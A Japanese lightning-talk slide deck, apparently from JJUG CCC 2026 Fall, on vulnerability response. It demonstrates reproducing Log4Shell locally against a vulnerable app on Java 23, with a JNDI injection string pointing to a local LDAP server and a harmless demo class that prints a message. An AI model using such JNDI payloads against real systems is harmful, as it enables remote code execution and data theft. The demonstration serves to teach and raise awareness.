---
marp: true
author: "@YujiSoftware"
title: "最近の脆弱性対応で思うこと"
description: "JJUG CCC 2026 Fall のライトニングトークです。"
image: "https://yuji.software/lightning/2026fall/card.png"
theme: gaia
style: |
  :root {
    --color-background: #fff;
    --color-foreground: #000;
    --color-highlight: #1a0dab;
    --color-dimmed: #888;
    font-size: 40px;
    line-height: 1.2;
  }

  /** 詰め気味に微調整 **/
  section > ul, marp-pre {
    margin: 0.5em 0;
  }
  h1 {
    margin-bottom: 0.5em;
  }

  section.lead img {
    border-radius: 50%;
    vertical-align: middle;
  }
  section.lead ul {
    list-style: none;
    padding-left: 0;
  }

  
  img[alt~="center"] {
    display: block;
    margin: 0 auto;
  }

  .info {
    border: 2px solid #dee2e6;
    background-color: #cff4fc;
    color: #052c65;
    padding: 0.5em;
    border-radius: 10px;
    margin: 10px 0;
  }
  .info::before {
    content: "📝";
  }

  span.emphasis {
    color: red;
    font-weight: bold;
  }
  span.underline {
    text-decoration: underline;
  }
  span.supplement {
    font-size: 36px;
  }

  div.balloon {
    display: flex;
    align-items: center;
  }

  div.balloon-right {
    justify-content: end;
  }
  div.balloon-right img {  
    border-radius: 50%;
  }
  
  div.balloon div {
    position: relative;
    display: inline-block;
    margin: 0.5em;
    padding: 1em;
    border-radius: 8px;
    text-align: left;
    line-height: 1.5;
    color: #000000;
  }
  div.balloon-right div {
    background-color: #A5FBFF;
  }
  div.balloon-left div {
    background-color: #FFDFDF;
  }

  div.balloon div::after {
    content: "";
    position: absolute;
    top: 50%;
    border-style: solid;
  }
  div.balloon-right div::after {
    right: 0;
    border-width: 10px 0 10px 20px;
    border-color: transparent transparent transparent #A5FBFF;
    translate: 100% -50%;
  }
  div.balloon-left div::after {
    left: 0;
    border-width: 10px 20px 10px 0;
    border-color: transparent #FFDFDF transparent transparent;
    translate: -100% -50%;
  }

  img.icon {
    border-radius: 50%;
    vertical-align: middle;
  }
  code {
    font-size: 1em !important;
  }
  .bold {
    font-weight: bold;
  }

---

<!-- _class: lead -->

# 最近の脆弱性対応で思うこと
<br>

![width:150px height:150px](../photo.jpg) @YujiSoftware

---

# 今季の一番のトピック

- 脆弱性対応！！！
  - Java4Shell
  - php2shell
  - nginx2shell
  - Copy Fail
  - \*sshole

毎日なにかしらの脆弱性が発見され、対応している状態

---

<!-- _class: lead -->

# 本当にその脆弱性は
# 悪用できるの？

---

<!-- _class: lead -->

## そんなあなたにピッタリの
## 脆弱性があります！
# &nbsp;
&nbsp;

---

<!-- _class: lead -->

## そんなあなたにピッタリの
## 脆弱性があります！
# Log4shell
（CVE-2021-44228）

---

# この脆弱性のここがすごい！

* CVEスコア: **10.0** （満点）
* 攻撃方法がとっても**簡単**
* たくさんのシステムが対象

<br>

* このような脆弱性に対してやるべきことはなにか

---

<!-- _class: lead -->

# 実際にやってみよう！

---

# やり方

- すでに公開されている PoC を使う
https://github.com/ubitech/cve-2021-44228-rce-poc/
- これを参考に、以下のコードを送り込んでみる
```java
public class Exploit {
    static {
        System.err.println("Exploit 😈");
    }
}
```

---

# 実行

- 攻撃サーバを起動
- 脆弱なプログラムを実行
```java
java \
  -jar vulnapp-0.0.1-SNAPSHOT-jar-with-dependencies.jar \
  {jndi:ldap://127.0.0.1:1389/Exploit} > /dev/null
```
<br>

* **→ 何も起きない**

---

# なぜ？

- Java 24 で原因となった機能が削除されていた
[\[JDK-8338536\] Permanently disable remote code downloading in JNDI](https://bugs.openjdk.org/browse/JDK-8338536)

- Java 23 以前でやるしかない…

---

# 実行

- 攻撃サーバを起動
- 脆弱なプログラムを **Java 23** で実行
```java
/usr/lib/jvm/jdk-23.0.2/bin/java \
  -jar vulnapp-0.0.1-SNAPSHOT-jar-with-dependencies.jar \
  {jndi:ldap://127.0.0.1:1389/Exploit} > /dev/null
```
---

# 実行

- 攻撃サーバを起動
- 脆弱なプログラムを **Java 23** で実行
```java
/usr/lib/jvm/jdk-23.0.2/bin/java \
  -jar vulnapp-0.0.1-SNAPSHOT-jar-with-dependencies.jar \
  {jndi:ldap://127.0.0.1:1389/Exploit} > /dev/null
```
- 成功！
```
Exploit 😈
```

---

# なにができる？

- クラスファイルがあれば何でもできる！
- 例えば…
    1) 環境変数の読み取り
    2) データの抜き取り
    3) 外部への送信

---

# なにができる？

- クラスファイルがあれば何でもできる！
- 例えば…
    1. 環境変数の読み取り
    2. データの抜き取り
    3. 外部への送信

<style scoped>
  .sudden-death {
    font-size: 60px;
    text-align: center;
  }
  .sudden-death span {
    font-weight: bold;
  }
</style>
<div class="sudden-death">
＿人人人人人人＿<br>
＞　<span>情報漏洩</span>　＜<br>
￣Y^Y^Y^Y^Y^￣
</div>

---

<!-- _class: lead -->

# みなさんも
# ぜひ試してみよう

---

<!-- _class: lead -->

### よいこのみんな
# 本番環境ではやらないでね！

---

<!-- _class: lead -->

### わるいこのみんな  
# 本番環境にアタック
# してくるんじゃねぇぇ💢

---

<!-- _class: lead -->

# 最近の脆弱性対応で思うこと
<br>

![width:150px height:150px](../photo.jpg) @YujiSoftware
